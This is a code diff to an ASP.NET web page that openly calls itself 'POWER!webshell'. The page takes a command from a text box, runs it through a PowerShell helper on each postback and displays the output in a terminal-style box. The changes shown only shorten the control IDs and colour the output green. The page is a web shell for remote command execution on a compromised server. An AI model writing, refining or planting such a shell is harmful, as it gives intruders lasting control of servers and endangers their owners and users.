@@ -36,10 +36,10 @@
     {
         if (Page.IsPostBack)
         {
-            if(inputTextBox.Text.Length > 0)
+            if(iTBox.Text.Length > 0)
             {
-                outputTextBox.Text = powershelled(inputTextBox.Text.Trim());
-                inputTextBox.Text = string.Empty;
+                oTBox.Text = powershelled(iTBox.Text.Trim());
+                iTBox.Text = string.Empty;
             }
         }
     }
@@ -53,11 +53,11 @@
     <form id="form1" runat="server">    
         <span>Index </span>
         <span>POWER!webshell</span>><br />
-    <asp:TextBox ID="outputTextBox" runat="server" BackColor="Black" 
-        Height="480px" ReadOnly="True" TextMode="MultiLine" 
+    <asp:TextBox ID="oTBox" runat="server" BackColor="Black" 
+        Height="480px" ReadOnly="True" TextMode="MultiLine" Forecolor="Green"
         Width="1200px" ToolTip="POWER!shell output"></asp:TextBox>
     <br />
-    <asp:TextBox ID="inputTextBox" runat="server" Width="1200px" 
+    <asp:TextBox ID="iTBox" runat="server" Width="1200px" 
         ToolTip="<POWER!shell command>"></asp:TextBox>
     </form>
 </body>
